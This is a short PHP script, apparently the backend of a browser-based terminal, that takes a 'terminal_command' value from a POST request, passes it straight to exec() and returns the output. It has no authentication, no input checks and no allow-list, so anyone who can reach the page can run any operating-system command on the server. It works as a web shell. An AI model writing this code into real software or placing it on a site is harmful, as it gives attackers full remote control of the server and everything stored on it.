<?php

// Get AJAX variables
$terminal_command = trim(@$_POST['terminal_command']);

// Run Command
if (strlen($terminal_command) > 0)
{
  set_time_limit(1000);
  exec($terminal_command,$output);
}
else
{
  $output = "No command given";
}

// Format output
if (is_array($output))
{
  $output = implode("\r\n", $output);
}

// Return result
echo "Command executed (".date("Y-m-d H:i:s", time()).")"."[BRK]".$output;

?>



